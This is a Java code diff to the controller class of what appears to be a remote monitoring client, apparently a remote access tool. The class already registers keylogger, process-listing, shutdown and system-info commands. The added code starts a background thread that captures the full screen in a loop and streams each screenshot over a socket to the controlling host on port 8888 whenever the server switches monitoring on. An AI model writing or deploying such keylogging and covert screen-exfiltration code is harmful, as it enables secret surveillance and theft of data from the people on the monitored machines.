@@ -13,8 +13,10 @@ import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.net.Socket;
 import java.util.*;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 import static utils.Command.*;
 import static utils.Environment.DEFAULT_FROM;
@@ -28,6 +30,7 @@ public class Controller {
     private static final String NOTIFICATION_PROPERTY = "notification";
     private static final String COUNTDOWN_PROPERTY = "countdown";
     private static final String PID_PROPERTY = "pid";
+    private static AtomicBoolean isMonitoring = new AtomicBoolean(false);
 
     public static void init() {
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
@@ -38,6 +41,34 @@ public class Controller {
         put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
         put(COMMAND_CLIENT_PROCESS, Controller::getProcess);
         put(COMMAND_SHUTDOWN_CLIENT, Controller::shutdown);
+        new Thread(() -> {
+            while (true) {
+                System.out.println("Waiting open streaming");
+                while (!isMonitoring.get()) {
+                    try {
+                        System.out.println("Waiting open streaming");
+                        Thread.sleep(1000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+
+                while (isMonitoring.get()) {
+                    Socket soc = null;
+                    try {
+                        soc = new Socket(SystemInfoModel.getIPHost(), 8888);
+                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+                        ByteArrayOutputStream ous = new ByteArrayOutputStream();
+                        ImageIO.write(image, "png", ous);
+                        soc.getOutputStream().write(ous.toByteArray());
+
+                        soc.close();
+                        Thread.sleep(10);
+                    } catch (Exception e) {
+                    }
+                }
+            }
+        }).start();
     }
 
     private static String getKeylogger(JSON input) {
@@ -54,16 +85,12 @@ public class Controller {
 
     private static String getClientMonitor(JSON input) {
         try {
-            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-            ImageIO.write(image, "jpg", byteArrayOutputStream);
-            byte[] tmp = byteArrayOutputStream.toByteArray();
-            return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_MONITOR)
-                    .put("image", new JSONArray(tmp))
-                    .put("length", tmp.length)
+            isMonitoring.set(input.getBoolean("isMonitoring"));
+            return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_ACK)
                     .json();
         } catch (Exception e) {
-            return getClientMonitor(input);
+            System.out.println(e);
+            return "";
         }
     }
 
@@ -85,7 +112,7 @@ public class Controller {
                 .filter(ph -> ph.parent().isPresent() && (ph.info().toString().length() > 2))
                 .forEach(process -> {
                     String[] cmd = process.info().command().get().split("\\\\");
-                    processes.put(new JSON().put(PID_PROPERTY, process.pid()).put("cmd", cmd[cmd.length-1]));
+                    processes.put(new JSON().put(PID_PROPERTY, process.pid()).put("cmd", cmd[cmd.length - 1]));
                 });
         return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_PROCESS).put("processes", processes).json();
     }
